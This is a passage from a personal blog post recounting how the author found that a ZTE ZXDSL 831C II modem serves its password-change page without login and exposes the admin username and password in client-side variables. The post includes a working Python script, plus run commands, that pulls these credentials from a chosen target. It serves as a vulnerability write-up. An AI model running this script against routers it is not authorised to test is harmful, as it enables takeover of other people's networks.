+<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;500&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">align</span><span class="o">=</span><span class="s">&#34;left&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;494&#34;</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;btnApplyAdmin()&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Apply&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This is the page used by the router to change the username and password to access the router.
+The one I showed you earlier.</p>
+<p>You might ask &ldquo;couldn&rsquo;t you just inspect the elements, while you were authenticated, and get the
+source code ?&rdquo;. That would be a valid question, and my answer would be &ldquo;because I&rsquo;m an idot,
+and I prefer doing stuff the hard way&rdquo;.</p>
+<p>Anyways if you try to access this site without creds, you would get access denied.</p>
+<p>Take note here though, On lines <code>11</code>
+, and <code>12</code> The page stores two variables called <code>nameAdmin</code>, and <code>pwdAdmin</code>, which are
+populated by the cgi script by the looks of <code>&lt;%ejGet(sysUserName)%&gt;</code>.</p>
+<p>On line <code>26</code> you would see where this page submits the creds to. It submits them to
+<code>adminpasswd.cgi</code>. After searching a lot for the source code of this cgi script, I couldn&rsquo;t
+find it anywhere, and I was avoiding googing for it, because I was afraid of spoilers.</p>
+<p>Finally I decided to visit the cgi script directly. I was shocked, I thought maybe the
+cookies from my earlier authentication might have had an effect. So I opened a new
+browser (qutebrowser), try again, and boom no need to authenticate to access this page.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-05_20-10.png"
+        data-srcset="./pic/2021-01-05_20-10.png, ./pic/2021-01-05_20-10.png 1.5x, ./pic/2021-01-05_20-10.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-05_20-10.png"
+        title="cgi script" /></p>
+<p>We can change the username, and password, and access the page boom hacked, but wait there
+is more</p>
+<p>If you&rsquo;re curious enough you wouldn&rsquo;t stop there you would dig for more. So let&rsquo;s dig some
+more.</p>
+<p>Obviously any site asks for the old password to check if you are who you say you are.
+This page dose the checking on the client side, in the open. Which means you can just
+snatch the username and password.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-05_20-12.png"
+        data-srcset="./pic/2021-01-05_20-12.png, ./pic/2021-01-05_20-12.png 1.5x, ./pic/2021-01-05_20-12.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-05_20-12.png"
+        title="inspec" /></p>
+<p>I wrote a script to do just that.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="c1"># This script extracts the Username and Password of the `ZTE - ZXDSL 831C II` </span>
+<span class="c1"># modem. </span>
+
+<span class="c1"># This script can only be used on a system you have the authority to </span>
+<span class="c1"># execute such scripts on. If you did this attack on a system you don&#39;t </span>
+<span class="c1"># have authority on I&#39;m not held responsible. Do so on your own risk.</span>
+
+<span class="c1"># author: Omer Abdulaziz</span>
+<span class="c1"># email: omerabdi@pm.me</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.1&#34;</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] Attacking {host} ...&#34;</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;http://{host}/adminpasswd.cgi&#34;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[!] Network error&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+    <span class="n">userna</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;nameAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">passwd</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;pwdAdmin = &#39;.*&#39;&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[=] Username: {userna}&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[=] Password: {passwd}&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[!] It appears the target is not vulnerable&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Running the script. The script runs on the <code>192.168.1.1</code> target by default, but you can
+change by supplying the target of your choice.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python exp.py
+
+<span class="c1"># or give it any other target</span>
+python exp.py 10.0.0.1
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pic/2021-01-04_20-18.png"
+        data-srcset="./pic/2021-01-04_20-18.png, ./pic/2021-01-04_20-18.png 1.5x, ./pic/2021-01-04_20-18.png 2x"
+        data-sizes="auto"
+        alt="./pic/2021-01-04_20-18.png"
+        title="exploit" /></p>
+<p>Inspired by malwaretech&rsquo;s &ldquo;<a href="https://www.malwaretech.com/2020/12/how-i-found-my-first-ever-zeroday-in-rdp.html" target="_blank" rel="noopener noreffer">How I Found My First Ever ZeroDay (in RDP)</a>&rdquo; post.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-01-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://omer-biz.github.io/posts/how_i_hacked_my_first_router/" data-title="How I hacked my first router" data-via="_th4tk1d" data-hashtags="hacking,router,ZTE,exploit"><i class="fab fa-twitter fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hacking/">hacking</a>,&nbsp;<a href="/tags/router/">router</a>,&nbsp;<a href="/tags/zte/">ZTE</a>,&nbsp;<a href="/tags/exploit/">exploit</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/remap-capslock-to-escape-and-ctrl/" class="prev" rel="prev" title="Remap Capslock to Escape and Ctrl"><i class="fas fa-angle-left fa-fw"></i>Remap Capslock to Escape and Ctrl</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
